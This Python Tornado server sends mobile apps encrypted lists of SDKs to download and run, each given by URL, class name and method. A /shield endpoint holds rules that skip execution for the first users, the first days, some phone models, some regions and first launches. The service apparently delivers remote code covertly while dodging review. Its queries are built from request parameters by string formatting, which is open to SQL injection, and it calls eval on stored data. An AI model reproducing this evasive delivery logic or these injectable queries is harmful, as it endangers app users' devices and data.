# coding=utf8
import re
import time
import tornado.ioloop
import tornado.web
import tornado.httpserver
from mysql_pool import connection_pool
from encryptbyarray import encryptText
import redis
import json
import datetime
# mRedisPool = redis.ConnectionPool(host='localhost', port=6379, password='ystc2505', decode_responses=True)
mRedisPool = redis.ConnectionPool(host='localhost', port=6379, decode_responses=True)


def selectSQL(sql):
    '''
    sql查询操作
    :param sql:
    :return:
    '''
    with connection_pool().cursor() as cur:
        try:
            cur.execute(sql)
            a = cur.fetchall()
            return a
        except Exception as e:
            print(e)
            return None


class UpdateCnzzHandler(tornado.web.RequestHandler):
    """
        返回要执行的sdk列表
    """

    def get(self, *args, **kwargs):
        try:
            rds = redis.Redis(connection_pool=mRedisPool)
            channel = self.get_argument("channel", "")
            if not channel:
                self.write("{}")
                return
            expired = 7 * 24 * 60 * 60
            # 通过渠道查找出关联的cnzz
            # :param cnzz 第0个cnzz
            key = 'cnzzmng_result_' + channel
            # 链接redis
            # 从redis中查找是否有盐(是为了看缓存中是否有所需要的json)
            result = rds.get(key)
            # 如果没有
            if not result:
                # 得到封装了子渠道所属母渠道下的所有sdk的格式化json
                sql = 'select cnzz from c_mother_channel where name="{}"'.format(channel)
                cnzz_ids = selectSQL(sql)
                cnzzIds = cnzz_ids[0]['cnzz'].split(',')
                cnzzs = tuple(map(lambda i: selectSQL('select website,eid from c_cnzz where id={}'.format(i)), cnzzIds))
                website = cnzzs[0][0]['website']
                eid = cnzzs[0][0]['eid']
                result = '{"expired":%d,"cnzz":"%s|%s"}' % (expired, website, eid)
                # 将这个盐作为键,结果作为值入到缓存,时间为1天
                result = encryptText(result)
                rds.set(key, result, 86400)
            self.write(result)
        except Exception as e:
            print('error: ', e)
            self.send_error(404)


class CheckHandler(tornado.web.RequestHandler):
    """
        返回对应的website和eid
    """

    def get(self, *args, **kwargs):
        """
        todo 什么时候将redis中的数据进行持久化?每天?
        :param args:
        :param kwargs:
        :return:
        """
        self.rds = redis.Redis(connection_pool=mRedisPool)
        channel = self.get_argument("channel", "")
        # uid = self.get_argument("uid", "")
        packname = self.get_argument("packname", "")
        sign = self.get_argument("sined", "")
        # 用包名/签名作为key 记录该key出现的次数
        key_ps = "{}_{}".format(packname, sign)
        pack_infos = self.rds.hgetall(channel)
        self.rds.hincrby(channel, key_ps)
        # redis中没有
        if not pack_infos:
            sql = 'select * from c_uid_count'
            results = selectSQL(sql)
            # 第一次
            if results:
                # [{'pack_sign': 'fjdsfdsafasdfads', 'count': 14}]
                pack_infos = {}
                tuple(map(lambda i: self.__mysql2Redis(i, channel, pack_infos), results))
        flag = 0
        pack_count_max_ = []
        # for pack_sign, count in pack_infos.items():
        pack_count_maxies = sorted(pack_infos.items(), key=lambda i: int(i[1]), reverse=True)
        for no, info in enumerate(pack_count_maxies):
            pack_sign, count = info
            if no == 0:
                flag = count
            if count == flag:
                pack_count_max_.append(pack_sign)
        if key_ps not in pack_count_max_:
            self.send_error(403)
            return
        key_chn = 'sdkmng_result_' + channel
        try:
            # 从redis中查找是否有盐(是为了看缓存中是否有所需要的json)
            result = self.rds.get(key_chn)
            # 如果没有
            if not result:
                # 得到封装了子渠道所属母渠道下的所有sdk的格式化json
                result = self.__queryChannel(channel)
                # 对盐进行加盐加密处理
                result = encryptText(result)
                # 将这个盐作为键,结果作为值入到缓存,时间为1天
                self.rds.set(key_chn, result, 86400)
            # 将对最终封装了sdk的json数据进行了加盐加密之后,返回到前端页面
            self.write(result)
        except Exception as e:
            print(e)
            self.send_error(404)

    # 查找渠道函数
    def __queryChannel(self, channel):
        # 从sqlite中查找对应子渠道对象列表
        sql = 'select sdk from c_mother_channel where name="{}"'.format(channel)
        sdks = selectSQL(sql)
        # 取出子渠道对象
        # 所对应的母渠道的sdkName,即子渠道所属母渠道下所有的SDK
        # 利用map函数对sdk列表进行格式化sdk处理(即转化为json数据),得到格式化后的json列表
        try:
            sdk_ids = sdks[0]['sdk'].split(",")
            sdks_info = tuple(map(lambda i: selectSQL(
                'select delay,apkParams,md5,method,className,download,sdkName,error,activity from c_sdk where id={}'.format(
                    i)), sdk_ids))
            data = tuple(map(lambda i: self.__sdk2json(i[0]), sdks_info))
            # 通过",".join()的方式将上面的json列表变为string
            result = '{"sdks":[%s]}' % (','.join(data))
            # 将结果转为str格式以防万一 为:'{"sdks":[{子渠道所属母渠道下的sdk1},{子渠道所属母渠道下的sdk2},{子渠道所属母渠道下的sdk3} ...]}'
            result = str(result)
            # 最终的json返回
            return result
        except:
            # 如果查不到
            # 则返回空字典字符串
            return self.write({})

    def __sdk2json(self, sdk):
        delayTime, param, md5, method, className, downUrl, sdkName, retryTime, activity = sdk['delay'], sdk[
            'apkParams'], sdk['md5'], sdk['method'], sdk['className'], sdk['download'], sdk['sdkName'], sdk['error'], \
                                                                                          sdk['activity']

        sdkFormat = {"delayTime": delayTime, "param": param or '{}', "md5": md5, "method": method,
                     "className": className,
                     "downUrl": downUrl, "sdkName": sdkName, "retryTime": retryTime, "activity": activity}
        sdkFormat = json.dumps(sdkFormat)
        return sdkFormat

    def __mysql2Redis(self, results, channel, pack_infos_dict):
        key = results['pack_sign']
        count_incr = results['count']
        count = self.rds.hincrby(channel, key, count_incr)
        pack_infos_dict[key] = count
        return pack_infos_dict


class ShieldHandler(tornado.web.RequestHandler):
    """
        返回屏蔽条件
    """

    def get(self, *args, **kwargs):
        self.rds = redis.Redis(connection_pool=mRedisPool)
        # print(self.request, args, kwargs)
        channel = self.get_argument("channel", "")
        uid = self.get_argument("uid", "")
        sdk = self.get_argument("sdk", "")
        model = self.get_argument("model", "")
        # print(channel, uid, sdk, model)
        result = dict()
        shield_info = dict()
        try:
            # 库中存在当前uid
            # 前n天不执行
            now = time.time()
            encrypt_str = self.rds.get(channel + "-" + uid + "-encrypt_str")
            if encrypt_str:
                # shield_date = eval(encrypt_str)["data"]["date"]
                # if shield_date > int(now):
                #     raise Exception("前n天不执行屏蔽")
                text = encryptText(encrypt_str)
                self.write(text)
                raise IOError("%s，(%s)，到达执行日期已返回数据" % (channel, uid))
            else:
                sql = "select * from c_operating_list,c_mother_channel,c_sdk where c_mother_channel.name='{}' and c_sdk.sdkName='{}' and c_mother_channel.id=c_operating_list.mother_channel and c_sdk.id=c_operating_list.sdk".format(
                    channel, sdk)
                info = selectSQL(sql)
                info = info[0]
                # print(info)
                date = info["rule12"]
                if not date:
                    date = 0
                shield_date = int(now) + int(date) * 86400
            shield_info["date"] = shield_date
            shield_Model = info["rule13"]
            modellist = shield_Model.split(",")
            # 机型屏蔽
            if model in modellist:
                raise Exception("机型屏蔽", model)
            # print(channel, uid, sdk, info)
            # 用户屏蔽数
            shield_users = info["rule2"]
            if not shield_users:
                shield_users = 0
            a = self.rds.scard(channel + "_shield_users")
            # 用户前n个用户不执行
            if int(shield_users) > a:
                print(info)
                self.rds.sadd(channel + "_shield_users", uid)
                raise Exception("前%s个用户屏蔽, %s" % (shield_users, uid))
            # print(rds.sismember(channel + "_shield_users", uid))
            # 用户在黑名单不受理
            if self.rds.sismember(channel + "_shield_users", uid):
                print(info)
                raise Exception("黑名单屏蔽", uid)
            b = self.rds.scard(channel + "_users")
            shield_users = info["rule11"]
            if not shield_users:
                shield_users = 0
            # 只做用户数量
            if int(shield_users) <= b:
                raise Exception("只做用户数量%d已达到%s" % (int(shield_users), b))
            self.rds.sadd(channel + "_users", uid)
            # json构建[app]
            shield_applist = info["rule3"]
            shield_applist = eval(re.sub("null", "[]", shield_applist))
            for shield in shield_applist:
                if shield["s"] == 0:
                    s = shield["rule1"]
                elif shield["s"] == 1:
                    f = shield["rule1"]
            shield_info["applist"] = {"s": s, "f": f}

            # json构建[地域]
            shield_area = info["rule1"]
            shield_area = eval(re.sub("null", "[]", shield_area))
            for shield in shield_area:
                # print(shield)
                if shield["s"] == 0:
                    s = shield["rule1"]
                    # print(s)
                elif shield["s"] == 1:
                    f = shield["rule1"]
                    # print(f)
            shield_info["area"] = {"s": s, "f": f}

            # json构建[运行时间与屏蔽时间]
            shield_time = info["rule4"]
            shield_time = eval(re.sub("null", "[]", shield_time))
            for shield in shield_time:
                if shield["s"] == 0:
                    s = shield["rule1"]
                    if not s:
                        s = [["00:00", "23:59"]]
                    else:
                        s = [s1.split("-") for s1 in s.split(",")]
                elif shield["s"] == 1:
                    f = shield["rule1"]
                    if not f:
                        f = [["00:00", "23:59"]]
                    else:
                        f = [f1.split("-") for f1 in f.split(",")]
            shield_info["time"] = {"s": s, "f": f}
            # times
            shield_info["times"] = {"s": [info["rule8"]]}
            result["state"] = "1"
            result[sdk] = dict(shield_info)
            text = encryptText(str(result))
            if self.rds.get(channel + "-" + uid + "-encrypt_str"):
                raise Exception("第一次进入不执行")
            self.rds.set(channel + "-" + uid + "-encrypt_str", result)
            self.write(text)
        except IOError as e:
            print("t", e)
        except Exception as e:
            print("e", e)
            self.write("{'state':'0'}")
class WakePoolHandler(tornado.web.RequestHandler):
    """
    唤醒类
    """

    def get(self, *args, **kwargs):
        self.rds = redis.Redis(connection_pool=mRedisPool)
        # print(self.request, args, kwargs)
        channel = self.get_argument("channel", "")
        action = self.get_argument("action", "notify")
        if channel:
            # 每个文案是随机的，所以不能将整个以channel形式储存,50万用户后运行效率差距太大，故还是改成以channel形式储存
            resultkey = 'wakepool_%s_list_%s' % (action, channel)
            # 1. 获取redis中的数据
            result = self.rds.get(resultkey)
            if not result:
                result = self.__getChannelWakelist(channel, action)
                self.rds.set(resultkey, result, 86400)
            return self.write(result)
        return self.write("")

    def __getChannelWakelist(self, channel, action):
        '''
        通过渠道得到需要唤醒的list集合
        :param channel: 渠道
        :param action: 活动
        :return: 唤醒list列表
        '''
        # 唤醒的list列表
        products = self.__getPidInfo(channel, action)
        # print("products : ",products)
        now = datetime.datetime.now()
        hour, minute, second = now.hour, now.minute, now.second
        tomorrow = now + datetime.timedelta(days=1, hours=-hour, minutes=-minute,
                                            seconds=-second)  # datetime.datetime(year=year,month=month,day=day+1)
        expired = int(time.mktime(tomorrow.timetuple())) * 1000
        runtimes = self.__getRunTimes()  # __dumpTime2Redis(cur,rds)
        result = '{"time":%s,"expired":%d,"data":[%s]}' % (runtimes, expired, ','.join(products))
        # print("__getChannelWakelist : ",result)
        return result

    def __formatProduct(self, product):
        '''
        格式化返回数据的格式
        :param product: map类型的数据
        :return:格式后的数据
        '''
        # channel,id,pkg,link,url,code,priority,msg,imgurl=product
        p_name, url, dpl, id, code, priority, msg, imgurl, adtime = product['p_name'], product['url'],product['deeplink'],product['id'], product['code'],product['priority'],product['msg'], product['imgurl'],product['adtime']
        fmt = '{"p_name":"%s","url":"%s","deeplink":"%s","id":"%s","code":"%s","priority":"%s","standtime":"10","msg":"%s","imgurl":"%s","adtime":"%s"}' % (
            p_name, url, dpl, id, code, priority, msg, imgurl, adtime)
        return fmt

    def __getPidInfo(self,  channel, action):
        '''
        通过渠道和活动类型获得唤醒列表
        :param channel: 渠道
        :param action: 活动类型 adview：唤醒；notify ：默认广告
        :return:返回格式化的数据
        '''
        type = 0
        if action == 'adview':
            type = 1
        date = datetime.datetime.now()
        # 2018-04-21 00:00:00
        now = date.strftime('%Y-%m-%d %X')
        sqlcmd = 'SELECT p_name,url,deeplink,id,code,priority,msg,imgurl,adtime FROM mod_product  WHERE channel="%s" and status=1 and type>=%d and starttime<"%s" and endtime>"%s"  ORDER BY priority DESC ;' % (
            channel, type, now, now)
        data = selectSQL(sqlcmd)
        # print(data)
        ps = map(self.__formatProduct, data)
        return ps

    def __getRunTimes(self):
        '''
        得到运行时间
        :return: 指定格式的时间
        '''
        sqlcmd = 'SELECT shour,sminute,ehour,eminute FROM mod_time;'
        data = selectSQL(sqlcmd)
        rdsdata = map(lambda i: '["%s:%s","%s:%s"]' % (i['shour'], i['sminute'], i['ehour'], i['eminute']), data)
        result = '[' + ','.join(rdsdata) + ']'
        # print("__getRunTimes",result)
        return result

class WakePoolRedisHandler(tornado.web.RequestHandler):
    """
    清除唤醒类的redis缓存
    """
    def get(self, *args, **kwargs):
        self.rds = redis.Redis(connection_pool=mRedisPool)
        keys = self.rds.keys("wakepool_*")
        for key in keys:
            self.rds.delete(key)
        return self.write("clear redis by key wakepool_")


def make_app():
    return tornado.web.Application([
        (r"/cnzz$", UpdateCnzzHandler),
        (r"/check$", CheckHandler),
        (r"/shield$", ShieldHandler),
        (r"/wakelist$", WakePoolHandler),
        (r"/redisupdate$", WakePoolRedisHandler),
    ])


if __name__ == '__main__':
    app = make_app()
    http_server = tornado.httpserver.HTTPServer(app)
    http_server.bind(8888)
    http_server.start(1)
    tornado.ioloop.IOLoop.current().start()



